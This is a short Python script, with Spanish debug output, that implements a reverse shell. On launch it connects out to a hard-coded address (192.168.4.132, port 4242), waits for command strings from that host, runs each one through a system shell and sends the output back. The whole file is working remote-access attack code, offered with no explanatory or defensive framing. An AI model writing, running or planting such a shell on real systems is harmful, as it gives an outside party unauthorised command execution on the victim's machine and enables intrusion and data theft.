import socket
import subprocess

BUFFER_SIZE = 1024
MESSAGE = 'echo Hola, mundo!'


class Shell:
    def __init__(self, ip, port, buffer_size=2048):
        self.port = port
        self.ip = ip
        self.bufs = buffer_size
        self.address = (self.ip, self.port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = True

    def connect(self):
        try:
            self.socket.connect(self.address)
            while True:
                self.chunk = self.socket.recv(self.bufs)
                self.chunks = []
                self.chunks.append(self.chunk)
                while len(self.chunk) != 0 and chr(self.chunk[-1]) != '\n':
                    self.chunk = self.socket.recv(self.bufs)
                    self.chunks.append(self.chunk)
                output = self.execCmd()
                if output is False:
                    break
                self.socket.sendall(output.stdout)

        except (TimeoutError):
            raise TimeoutError

    def execCmd(self):
        cmd = (b''.join(self.chunks)).decode()[:-1]
        if cmd == "exit":
            self.socket.close()
        print("comando: ", cmd)
        output = subprocess.run(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                shell=True)
        print("salida: ", output)
        return output


session = Shell("192.168.4.132", 4242)
session.connect()
